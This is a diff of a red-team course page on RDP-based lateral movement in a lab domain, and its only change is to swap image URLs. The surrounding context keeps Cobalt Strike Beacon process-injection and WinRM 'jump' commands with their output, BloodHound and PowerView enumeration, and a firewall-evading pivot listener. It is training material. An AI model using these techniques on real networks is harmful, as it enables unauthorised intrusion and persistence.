@@ -47,7 +47,7 @@ A methodology that has worked well for me in the past, is to enumerate the curre
 
 BloodHound will show that `Jump Users` have first degree RDP rights to **EXCH-1** and **SQL-1**.
 
-![.gitbook/assets/1663788103.png](http://res.cloudinary.com/dr4gsg09f/image/upload/v1663788103/hzygb0pufrnwvrqvvkcf.png)
+![](https://rto-assets.s3.eu-west-2.amazonaws.com/domain-trusts/jump-users-rdp.png)
 
 `Get-DomainGPOUserLocalGroupMapping` and `Find-DomainLocalGroupMember` can both work as well.
 
@@ -145,7 +145,7 @@ beacon> inject 4960 x64 tcp-local
 [+] established link to child beacon: 10.10.15.90
 ```
 
-![.gitbook/assets/1663788103.png](http://res.cloudinary.com/dr4gsg09f/image/upload/v1663788104/koi357oc8rkxrcasfc4a.png)
+![](https://rto-assets.s3.eu-west-2.amazonaws.com/domain-trusts/sql1-jeanwise.png)
 
 In that Beacon, we are `jean.wise`.
 
@@ -187,7 +187,7 @@ beacon> jump winrm64 sql01.zeropointsecurity.local pivot-sql-1
 [+] established link to child beacon: 10.10.18.221
 ```
 
-![.gitbook/assets/1663788103.png](http://res.cloudinary.com/dr4gsg09f/image/upload/v1663788105/ca017iqtyisypnnogwrp.png)
+![](https://rto-assets.s3.eu-west-2.amazonaws.com/domain-trusts/sql01-jeanwise.png)
 
 I use another Pivot Listener here because with the Windows Firewall enabled on SQL01, we can't connect inbound to 445 (so no SMB listener) or other arbitrary ports like 4444 (so no TCP listener). The Windows Firewall is not enabled on SQL-1, so we can bind to a high-port and catch the reverse connection from the Pivot Listener.
 
@@ -239,4 +239,4 @@ beacon> ls
 
 Disconnect and reconnect to the console of sql01.zeropointsecurity.local to simulate a user logoff/logon, and the Beacon will execute.
 
-![.gitbook/assets/1663788103.png](http://res.cloudinary.com/dr4gsg09f/image/upload/v1663788106/fzaaodt4i2kim6ubc0tu.png)
+![](https://rto-assets.s3.eu-west-2.amazonaws.com/domain-trusts/rdpinception.png)
